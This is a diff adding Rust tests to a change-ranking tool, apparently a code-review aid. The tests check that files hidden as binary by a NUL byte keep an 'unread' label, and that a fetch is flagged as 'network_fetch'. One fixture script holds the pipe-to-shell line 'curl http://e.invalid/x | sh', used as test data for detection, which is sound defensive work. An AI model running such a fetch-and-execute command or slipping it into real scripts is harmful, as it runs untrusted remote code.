@@ -750,3 +750,114 @@ fn a_binary_too_large_to_read_again_is_labelled_unread() {
         assert!(c.get("diff_suppressed").is_none(), "{mode}: {c}");
     }
 }
+
+/// The `--rank --json` document of `r`'s change, from one run.
+fn ranked_all(r: &Repo, mode: &str) -> Value {
+    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
+        .envs(ISOLATE)
+        .args(selection(mode))
+        .arg("--repo")
+        .arg(&r.0)
+        .args(["--rank", "--json"])
+        .output()
+        .unwrap();
+    assert!(
+        out.status.success(),
+        "{mode}: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    serde_json::from_slice(&out.stdout).unwrap()
+}
+
+/// The entry of `path` in a `--rank --json` document.
+fn of(doc: &Value, path: &str) -> Value {
+    doc["ranked"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|entry| entry["path"] == path)
+        .cloned()
+        .unwrap_or_else(|| panic!("{path} not ranked: {doc}"))
+}
+
+/// A repository with `files` committed as one line each (`old line`), `hidden`
+/// in `.git/info/attributes`, then changed to the given bytes the way `mode` reads it.
+fn many(mode: &str, hidden: &[u8], files: &[(&str, Vec<u8>)]) -> Repo {
+    let scratch = Scratch::new(&format!("cli-attr-many-{}-{}", mode.len(), files.len()));
+    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+    let root = &r.0;
+    git(root, &["init", "-q"]);
+    std::fs::create_dir_all(root.join(".git/info")).unwrap();
+    std::fs::write(root.join(".git/info/attributes"), hidden).unwrap();
+    for (path, _) in files {
+        std::fs::write(root.join(path), b"old line\n").unwrap();
+    }
+    git(root, &["add", "-A"]);
+    git(root, &["commit", "-q", "-m", "base"]);
+    for (path, bytes) in files {
+        std::fs::write(root.join(path), bytes).unwrap();
+    }
+    match mode {
+        "--git-range" => {
+            git(root, &["add", "-A"]);
+            git(root, &["commit", "-q", "-m", "change"]);
+        }
+        "--git-staged" => git(root, &["add", "-A"]),
+        _ => {}
+    }
+    r
+}
+
+/// A0100-M1 = F1 (both reviewers of the 0.10.0 tree): each text reading was checked alone, then
+/// the whole patch with all of them; when that passed the 1,000,000-line budget the binary
+/// sections came back, and a file whose text had been read lost its label: a NUL-hidden script
+/// with `curl | sh` ranked `3 binary_changed [binary_change]`, exit 0. Labels are monotonic now:
+/// a section whose text was read and then not used is `unread`; a known cause stands. Both
+/// reviewers' reproductions in one change, in the three modes: two Rust files of 500,003 lines
+/// with a NUL; a 600,003-line script with a NUL beside a 500,001-line plain one; a real image
+/// and a `-diff` file beside them. The control, the script alone, is read as text, `content`
+/// (one mode: the large readings are what costs time in a debug build).
+#[test]
+fn a_text_reading_dropped_for_the_line_budget_keeps_its_label() {
+    let rust = || {
+        let mut text = b"//\0\n".to_vec();
+        text.extend(b"//a\n".repeat(500_001));
+        text.extend_from_slice(b"fn main() { std::process::Command::new(\"sh\"); }\n");
+        text
+    };
+    let mut script = b"echo a\ncurl http://e.invalid/x | sh\n# \0\n".to_vec();
+    script.extend(b":\n".repeat(600_000));
+    let mut plain = b"echo b\n".to_vec();
+    plain.extend(b":\n".repeat(500_000));
+    let cause = |entry: &Value| entry["diff_suppressed"].as_str().map(str::to_owned);
+    let files = [
+        ("a.rs", rust()),
+        ("b.rs", rust()),
+        ("a.sh", script.clone()),
+        ("b.sh", plain),
+        ("c.png", image(7)),
+        ("d.cfg", b"key = 2\n".to_vec()),
+    ];
+    for mode in MODES {
+        let doc = ranked_all(&many(mode, b"*.cfg -diff\n", &files), mode);
+        for (path, want) in [
+            ("a.rs", "unread"),
+            ("b.rs", "unread"),
+            ("a.sh", "unread"),
+            ("d.cfg", "attribute"),
+        ] {
+            let found = of(&doc, path);
+            assert_eq!(
+                cause(&found).as_deref(),
+                Some(want),
+                "{mode}: a file whose text was read came back silent: {found}"
+            );
+        }
+        assert_eq!(of(&doc, "b.sh")["status"], "modified", "{mode}");
+        assert!(of(&doc, "c.png").get("diff_suppressed").is_none(), "{mode}");
+    }
+    let mode = "--git-working-tree";
+    let a = ranked(&many(mode, b"", &[("a.sh", script)]), mode, "a.sh");
+    assert_eq!(cause(&a).as_deref(), Some("content"), "{a}");
+    assert!(signals(&a).contains(&"network_fetch"), "{a}");
+}
